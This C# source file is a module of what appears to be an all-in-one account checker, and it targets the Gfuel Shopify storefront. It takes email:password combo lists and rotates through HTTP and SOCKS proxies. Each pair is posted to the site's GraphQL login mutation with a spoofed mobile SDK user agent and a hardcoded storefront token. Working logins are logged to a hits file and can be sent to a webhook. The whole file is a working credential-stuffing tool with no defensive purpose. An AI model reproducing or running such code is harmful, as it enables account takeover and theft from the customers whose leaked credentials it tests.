using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Gfuelmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mobile Buy SDK Android/3.2.3/com.aeron.shopifycore.gfuel";
                            req.KeepAliveTimeout = 5000;
                            req.ReadWriteTimeout = 5000;
                            req.ConnectTimeout = 5000;
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.UseCookies = true;
                            req.KeepAlive = true;
                            req.AddHeader("Accept", "application/json");
                            req.AddHeader("X-BUY3-SDK-CACHE-FETCH-STRATEGY", "NETWORK_ONLY");
                            req.AddHeader("X-BUY3-SDK-EXPIRE-TIMEOUT", "0");
                            req.AddHeader("User-Agent", "Mobile Buy SDK Android/3.2.3/com.aeron.shopifycore.gfuel");
                            req.AddHeader("X-SDK-Version", "3.2.3");
                            req.AddHeader("X-SDK-Variant", "android");
                            req.AddHeader("X-Shopify-Storefront-Access-Token", "21765aa7568fd627c44d68bde191f6c0");
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            if (req.Post("https://gfuel.com/api/graphql",
                                "mutation{customerAccessTokenCreate(input:{email:\"" + array[0] + "\",password:\"" +
                                array[1] +
                                "\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}",
                                "application/graphql; charset=utf-8").ToString().Contains("accessToken"))
                            {
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Gfuel_hits", array[0] + ":" + array[1]);
                                if (Program.lorc == "LOG") Settings.PrintHit("Gfuel", array[0] + ":" + array[1]);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Gfuel Hits");
                            }
                            else
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}